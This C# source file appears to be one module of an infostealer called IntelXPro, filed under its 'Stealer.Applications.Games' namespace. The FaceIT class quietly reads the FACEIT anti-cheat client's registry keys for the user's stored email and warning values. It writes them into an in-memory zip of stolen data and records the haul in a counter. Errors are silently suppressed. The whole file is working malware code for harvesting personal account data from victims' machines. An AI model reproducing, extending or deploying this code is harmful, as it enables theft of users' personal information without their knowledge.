using IntelXPro.src.IntelXPro.Dependencies.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Games
{
    internal class FaceIT : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "FACEIT Anti Cheat";
            List<string> faceitData = new List<string>();
            int dataCount = 0;

            try
            {
                using (RegistryKey faceitKey = Registry.CurrentUser.OpenSubKey("Software\\FACEIT\\FACEIT Client"))
                {
                    if (faceitKey != null)
                    {
                        string email = faceitKey.GetValue("email") as string;
                        if (!string.IsNullOrEmpty(email))
                        {
                            faceitData.Add("Email: " + email);
                            dataCount++;
                        }
                    }
                }
            }
            catch
            {
            }

            try
            {
                using (RegistryKey warningKey = Registry.CurrentUser.OpenSubKey("Software\\FACEIT\\FACEIT Client\\warning"))
                {
                    if (warningKey != null)
                    {
                        string[] valueNames = warningKey.GetValueNames();
                        foreach (string valueName in valueNames)
                        {
                            string value = warningKey.GetValue(valueName) as string;
                            if (!string.IsNullOrEmpty(value))
                            {
                                faceitData.Add("Warning - " + valueName + ": " + value);
                                dataCount++;
                            }
                        }
                    }
                }
            }
            catch
            {
            }

            if (dataCount > 0)
            {
                string text = "FaceIT\\registry_data.txt";
                zip.AddTextFile(text, string.Join("\n", faceitData));
                counterApplications.Files.Add("HKEY_CURRENT_USER\\Software\\FACEIT => " + text);
                counterApplications.Files.Add("FaceIT\\");
                counter.Games.Add(counterApplications);
            }
        }
    }
}
